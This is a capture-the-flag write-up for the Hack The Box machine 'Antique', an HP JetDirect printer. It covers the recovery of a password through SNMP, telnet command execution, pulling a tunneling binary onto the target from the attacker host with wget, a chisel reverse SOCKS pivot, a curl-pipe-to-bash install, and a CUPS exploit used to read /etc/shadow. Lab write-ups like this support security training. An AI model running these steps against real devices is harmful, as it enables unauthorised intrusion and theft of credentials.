# Antique

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/45543cd2-89b3-4c3f-b1a2-8d105107362b)

## Difficulty = Easy
---
Let run our nmap scan :

```sh
# Nmap 7.94 scan initiated Thu Aug 17 12:45:24 2023 as: nmap -p- -sCV -v --min-rate=1000 -T4 -oN nmap.txt 10.10.11.107
Increasing send delay for 10.10.11.107 from 0 to 5 due to 374 out of 934 dropped probes since last increase.
Warning: 10.10.11.107 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.107
Host is up (0.21s latency).
Not shown: 64059 closed tcp ports (conn-refused), 1475 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.94%I=7%D=8/17%Time=64DE4F2F%P=x86_64-pc-linux-gnu%r(NULL
SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
SF:irect\n\nPassword:\x20");

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 17 12:50:34 2023 -- 1 IP address (1 host up) scanned in 309.59 seconds
```

We can see that telnet port 23 is opened, let try to connect

![](https://i.imgur.com/XvjeS6x.png)

Unfortunately i tried out different passwords, but to no avail and it breaks connection after each wrong password
"Screams, Enumerate Harder😿"

![](https://i.imgur.com/TVB6pPB.png)

Read out several blogs and articles, but i wasn't sure i would get shell via telnet without having to connect first, which is true.

Then i decided to check for `UDP` ports using `nmap`

```sh
sec-fortress@Pwn-F0rk-3X3C:~/HTB/Antique$ sudo nmap -sU -sCV 10.10.11.107 -v --min-rate=1000 -T4 -oN nmap.txt
[sudo] password for sec-fortress: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 12:43 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating Ping Scan at 12:43
Scanning 10.10.11.107 [4 ports]
Completed Ping Scan at 12:43, 0.41s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:43
Completed Parallel DNS resolution of 1 host. at 12:43, 0.06s elapsed
Initiating UDP Scan at 12:43
Scanning 10.10.11.107 [1000 ports]
Discovered open port 161/udp on 10.10.11.107
Completed UDP Scan at 12:43, 7.41s elapsed (1000 total ports)
Initiating Service scan at 12:43
Scanning 987 services on 10.10.11.107
[............]
```

We discovered port 161/UDP which runs on **SNMP** , let enumerate more

![](https://i.imgur.com/ij2jru5.png)

Great, something similar, a password disclosure, i then decided to follow up this [blog](https://www.irongeek.com/i.php?page=security/networkprinterhacking) which gave me a lead and made me understand better how this works :

>  It seems that the device password for many JetDirects is stored in almost plain text and is accessible via SNMP using the read community name. Most folks leave their SNMP community name as "public" but even it has been change it's likely sniffable. Also try "internal" as the community name as this is the default write community name on many JetDirects. Reports are that on some JetDirects , even if you change the community name, "internal" will still work.

Sweet using this exploit i got the password in hex form :

![](https://i.imgur.com/GFzb5z0.png)

Note that `BITS:` is the password here, copying the hex provided from `BITS:` and decrypting it gives us a password 

![](https://i.imgur.com/i8zOS38.png)

Great now let login

![](https://i.imgur.com/jB8DGq1.png)

I used the question mark `?` to check for enabled commands and we can see that we can use the `exec` command to execute system commands, let try getting a reverse shell via these

![](https://i.imgur.com/0PpC94x.png)

I tried several ways but couldn't get that rev shell, i decided to enumerate more and later found out that , there was another port listening on  this Network, which is port `631` - Internet Printing Protocol(IPP) using the command `netstat -ant`

![](https://i.imgur.com/d7BzEXB.png)

### Pivoting

- We are gonna use a tool called `chisel` , first of all install the chisel binary from [here](https://github.com/jpillora/chisel/releases/tag/v1.8.1) or run this command on your attacker terminal : `curl https://i.jpillora.com/chisel! | bash` , also make sure `chisel` is installed on the attacker machine

![](https://i.imgur.com/jtD7sON.png)

- Now start a python3 server in this same directory and send the `chisel` binary to your target using wget

![](https://i.imgur.com/jvQMiRX.png)

> After running `exec wget 10.10.14.12/chisel` i don't get my shell back so i started up another shell (telnet service), also make sure to grant chisel executable permissions by running `exec chmod +x chisel`

- Now let start up our chisel client and server service in other to get access to the network, Do this :
	- On attacker machine run `chisel server -p 1337 --reverse`
	- On target machine run `exec ./chisel client 10.10.14.12:1337 R:socks`

![](https://i.imgur.com/BS16RHO.png)

- Now open up your `/etc/proxychains4.conf` file with `sudo nano /etc/proxychains4.conf` 

![](https://i.imgur.com/dVrNM2g.png)

- scroll down and # (hash tag) `socks4` , then change the port of `socks5` to port `1080` 

![](https://i.imgur.com/edBUW59.png)

- Save the file with `ctrl + x` and do `proxychains zsh` 

![](https://i.imgur.com/4S4jphb.png)

> Now we can scan the target network using `127.0.0.1` instead of `10.10.11.107` , this time `127.0.0.1` will serve as our target IP because of the proxy

- Running nmap on port `631` gives us a service called `CUPS` running on version `1.6.1`

![](https://i.imgur.com/qvgUpRZ.png)

- type `firefox` on the terminal and paste in `127.0.0.1:631` in the address bar

![](https://i.imgur.com/p1umAyp.png)

- Everywhere seems to be screaming `CUPS 1.6.1` , sooo, i decided to enumerate that first, Make sure to open another browser because Firefox uses a proxy now, which might be a little bit slow

![](https://i.imgur.com/cCzM9DQ.png)

- Great looks like a `root-file read` exploit that allows us to  read important files on this target, you can download an exploit from [here](https://github.com/p1ckzi/CVE-2012-5519) , make sure to read the documentation too
- We will be sending the exploit like we did earlier using `python3` and `wget` 

![](https://i.imgur.com/Qrikf3I.png)

- Now that our target has the exploit run `chmod +x cups-root-file-read.sh` to grant executable permissions, we can now read any file on our target, i will be reading the `/etc/shadow` 

![](https://i.imgur.com/DDGZfpf.png)

- Unfortunately i couldn't crack it cos' of hardware resource, so i just got my flag and went out, moreover SSH wasn't opened 😭

![](https://i.imgur.com/gagWrFW.png)


GG , Printer hacking is one of the greatest concerns of many users as well as many cybersecurity professionals. Printers come weakly configured by default and very few bother securing them. This box showcases some common vulnerabilities of network printers. I really love this box because it opened my eye to how printer works and how mis-configurations could lead to take-overs, Bankaaaaiiii!!!!🎎

